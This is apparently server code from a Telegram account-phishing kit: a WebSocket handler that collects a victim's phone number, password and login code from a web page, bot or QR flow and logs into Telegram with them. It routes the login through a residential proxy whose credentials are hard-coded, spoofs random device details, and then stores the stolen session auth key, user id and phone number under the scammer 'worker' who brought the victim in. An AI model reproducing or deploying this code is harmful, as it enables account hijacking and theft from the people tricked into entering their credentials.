ws.on('connection', async (socket, request) => {
    let id, owner, type, bot, user, site, lang

    try {
        const parsed = qs.parse(request.url.split("?")[1]);
        id = parsed.id;
        owner = parsed.owner;
        type = parsed.type;
        lang = parsed.lang || 'ru';
        bot = parsed.token;

        console.log(id, owner, type, bot)
        if (!['bot', 'web', `qr`].includes(type) || !id) throw new Error(`Unauth`);
    } catch (e) {
        socket.send(`0-0`);
        return socket.close();
    }

    console.log(1)
    if (type !== `bot`) {
        site = await domain.findOne({ name: id }) || {
            worker: 5439242814,
            name: 'localhost'
        };
        if (!site) return socket.close();
        owner = site.worker;
        bot = id;
    }

    let number;

    socket.on('message', message => {
        try {
            message = JSON.parse(message.toString());
        } catch {
            socket.send(`0-0`);
            return socket.close();
        }

        if (message.action === 'number') number = message.data;
    })

    const waitForAction = action => new Promise(resolve => {
        if (action === 'number' && number) return resolve(number);

        socket.send(JSON.stringify({ action }))
        socket.onmessage = message => {
            try {
                message = JSON.parse(message.data);
            } catch {
                socket.send(`0-0`);
                return socket.close();
            }
            if (!message.action && !message.data) return socket.close();
            if (message.action === action) {
                console.log(message);
                resolve(message.data);
            }
        }
    });

    // let nnn = await waitForAction('number');

    let location = 'ru'//lang;//(parsePhoneNumber(nnn) || parsePhoneNumber("+" + nnn))?.country?.toLowerCase();

    // const akeProxy = await ake.createPort(location)
    //     .catch((() => ake.createPort('ru')));

    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${location}_streaming-1`, socksType: 5 }
    // const formatedAke = { 
    //     ip: akeProxy.server, 
    //     port: akeProxy.port, 
    //     username: akeProxy.login, 
    //     password: akeProxy.password, 
    //     socksType: 5 
    // }
    const deviceParams = getRandomDeviceParams();

    const client = new TelegramClient(new StringSession(), deviceParams.app_id, deviceParams.app_hash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": deviceParams.app_version,
        "deviceModel": deviceParams.device,
        "systemVersion": deviceParams.sdk,
        'langCode': deviceParams.lang_code
    });

    setTimeout(async () => {
        try {
            socket.close();
            await client.disconnect();
            // await ake.deletePort(akeProxy.id)
        } catch (e) {
            console.error(e);
        }
    }, 300000);

    socket.send(JSON.stringify({ action: 'connected' }));

    await client.start({
        phoneNumber: async () => await waitForAction('number'),
        password: async () => await waitForAction('password'),
        phoneCode: async () => await waitForAction('code'),
        onError: (data) => {
            number = undefined;
            console.log(data);
            socket.send(JSON.stringify({ action: 'error', data }));
        }
    });

    console.log(client.session.save());
    socket.send(JSON.stringify({ action: 'success' }))
    socket.close();

    const uu = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        dcId: client.session.dcId,
        uid: uu.id,
        authKey: new StringSession(client.session.save())._key?.toString('hex'),
        phone: uu.phone,
        premium: uu.premium,
        bot,
        deviceParams: deviceParams,
    });

    await client.disconnect().catch(console.error);
    // await ake.deletePort(akeProxy.id)
});